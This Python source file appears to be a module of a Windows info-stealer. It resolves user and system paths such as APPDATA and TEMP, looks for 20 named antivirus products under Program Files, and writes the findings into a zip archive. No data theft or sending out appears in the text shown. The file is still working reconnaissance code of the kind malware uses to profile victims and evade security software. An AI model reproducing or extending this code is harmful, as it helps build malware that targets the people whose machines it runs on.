import os
from pathlib import Path

class Paths:
    def __init__(self):
        self.temp = Path(os.environ["TEMP"])
        self.windows = os.environ.get("WINDIR")
        self.userprofile = Path(os.environ["USERPROFILE"])
        self.appdata_local = Path(os.environ["LOCALAPPDATA"])
        self.appdata_roaming = Path(os.environ["APPDATA"])
        
        program_files = os.environ.get("ProgramFiles")
        program_files_x86 = os.environ.get("ProgramFiles(x86)")
        self.program_files = Path(program_files or program_files_x86)
        self.program_files_x86 = Path(program_files_x86)

def AntiVirus_Infos(zip_file):
        path_program_files = Paths().program_files
        path_program_files_x86 = Paths().program_files_x86
        antivirus_list = [
            "Avast Antivirus",
            "AVG Antivirus",
            "Avira Antivirus",
            "Bitdefender Antivirus",
            "Kaspersky Antivirus",
            "McAfee Antivirus",
            "Norton Antivirus",
            "ESET NOD32 Antivirus",
            "Trend Micro Antivirus",
            "Windows Defender",
            "Malwarebytes",
            "Sophos Home",
            "Panda Dome",
            "F-Secure SAFE",
            "Webroot SecureAnywhere",
            "BullGuard Antivirus",
            "ZoneAlarm Free Antivirus",
            "Adaware Antivirus",
            "Comodo Antivirus",
            "360 Total Security"
        ]

        found_antivirus = []

        for antivirus in antivirus_list:
            paths_to_check = [
                os.path.join(path_program_files, antivirus),
                os.path.join(path_program_files_x86, antivirus)
            ]
            for path in paths_to_check:
                if os.path.exists(path):
                    found_antivirus.append(antivirus)
                    break

        if found_antivirus:
            antivirus_info = "Antivirus software found on the system:\n- " + "\n- ".join(found_antivirus)
        else:
            antivirus_info = "No antivirus software found on the system."

        zip_file.writestr("Antivirus Info.txt", antivirus_info)

        return len(found_antivirus)